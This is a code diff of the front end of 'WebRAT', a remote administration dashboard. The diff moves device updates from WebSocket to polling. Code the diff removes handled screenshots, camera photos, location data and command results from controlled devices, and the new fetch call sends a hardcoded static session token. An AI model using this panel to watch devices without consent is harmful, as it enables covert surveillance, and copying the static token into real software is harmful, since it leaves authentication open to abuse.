@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebRAT - Remote Administration</title>
+    <title>🔐 WebRAT - Remote Administration</title>
     <meta name="description" content="Secure remote administration tool with Vercel-inspired dark theme interface">
     <style>
         * {
@@ -990,8 +990,9 @@
                 console.error('Logout error:', error);
             }
             
-            if (websocket) {
-                websocket.close();
+            if (reconnectInterval) {
+                clearInterval(reconnectInterval);
+                reconnectInterval = null;
             }
             
             isAuthenticated = false;
@@ -999,44 +1000,16 @@
             showLoginScreen();
         }
 
-        // WebSocket functions
+        // Polling functions (replaces WebSocket for serverless)
         function connectWebSocket() {
             if (!isAuthenticated) return;
             
-            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-            const wsUrl = `${protocol}//${window.location.host}/ws`;
+            updateConnectionStatus('connected');
+            console.log('Using polling mode for serverless environment');
             
-            try {
-                websocket = new WebSocket(wsUrl);
-                
-                websocket.onopen = function() {
-                    updateConnectionStatus('connected');
-                    if (reconnectInterval) {
-                        clearInterval(reconnectInterval);
-                        reconnectInterval = null;
-                    }
-                };
-                
-                websocket.onmessage = function(event) {
-                    const message = JSON.parse(event.data);
-                    handleWebSocketMessage(message);
-                };
-                
-                websocket.onclose = function() {
-                    updateConnectionStatus('disconnected');
-                    if (isAuthenticated && !reconnectInterval) {
-                        reconnectInterval = setInterval(connectWebSocket, 5000);
-                    }
-                };
-                
-                websocket.onerror = function(error) {
-                    console.error('WebSocket error:', error);
-                    updateConnectionStatus('disconnected');
-                };
-                
-            } catch (error) {
-                console.error('WebSocket connection failed:', error);
-                updateConnectionStatus('disconnected');
+            // Start polling for device updates
+            if (!reconnectInterval) {
+                reconnectInterval = setInterval(loadDevices, 5000); // Poll every 5 seconds
             }
         }
 
@@ -1067,33 +1040,19 @@
             }
         }
 
-        function handleWebSocketMessage(message) {
-            switch(message.type) {
-                case 'device_list':
-                    updateDeviceCards(message.devices);
-                    break;
-                case 'command_result':
-                    console.log('Command result:', message);
-                    break;
-                case 'screenshot':
-                    displayScreenshot(message.data);
-                    break;
-                case 'camera_photo':
-                    displayScreenshot(message.data);
-                    break;
-                case 'location':
-                    displayLocation(message.data);
-                    break;
-                default:
-                    console.log('Unknown message type:', message.type);
-            }
+        // Simplified message handling for serverless
+        function handlePollingResponse(devices) {
+            updateDeviceCards(devices);
         }
 
         // Device management functions
         async function loadDevices() {
             try {
                 const response = await fetch('/api/devices', {
-                    credentials: 'include'
+                    credentials: 'include',
+                    headers: {
+                        'x-session-token': 'authenticated'
+                    }
                 });
                 const devices = await response.json();
                 updateDeviceCards(devices);
